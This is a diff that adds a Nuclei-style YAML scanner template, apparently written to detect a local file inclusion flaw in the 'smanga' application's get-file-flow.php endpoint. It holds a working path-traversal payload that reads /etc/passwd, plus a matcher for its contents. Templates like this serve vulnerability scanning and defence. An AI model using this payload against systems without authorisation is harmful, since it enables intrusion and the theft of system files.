@@ -1,0 +1,23 @@
+
+id: smanga-get-file-flow-lfi
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /php/get-file-flow.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: thinkphp_show_page_trace=0|0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+
+        file=../../../../../../../../etc/passwd
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,'root:x:0:0:root:')
